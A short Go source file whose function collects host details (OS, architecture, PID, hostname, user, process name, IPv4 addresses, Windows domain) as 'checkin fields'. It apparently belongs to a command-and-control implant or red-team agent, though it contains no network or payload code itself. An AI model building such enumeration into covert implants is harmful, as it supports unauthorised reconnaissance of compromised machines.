package main

import (
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
)

type sysinfo struct {
	ips     []string
	os      string
	user    string
	host    string
	pid     int
	arch    string
	domain  string
	process string
}

// collectSysinfo gathers checkin fields. Every lookup degrades to a zero
// value; checkin must never fail on host enumeration.
func collectSysinfo() sysinfo {
	var info sysinfo
	info.os = runtime.GOOS
	info.arch = runtime.GOARCH
	info.pid = os.Getpid()
	if h, err := os.Hostname(); err == nil {
		info.host = h
	}
	if u, err := user.Current(); err == nil {
		info.user = u.Username
	}
	if exe, err := os.Executable(); err == nil {
		info.process = filepath.Base(exe)
	}
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				if v4 := ip.To4(); v4 != nil {
					info.ips = append(info.ips, v4.String())
				}
			}
		}
	}
	if info.domain = os.Getenv("USERDNSDOMAIN"); info.domain == "" {
		info.domain = os.Getenv("USERDOMAIN")
	}
	if info.ips == nil {
		info.ips = []string{}
	}
	return info
}
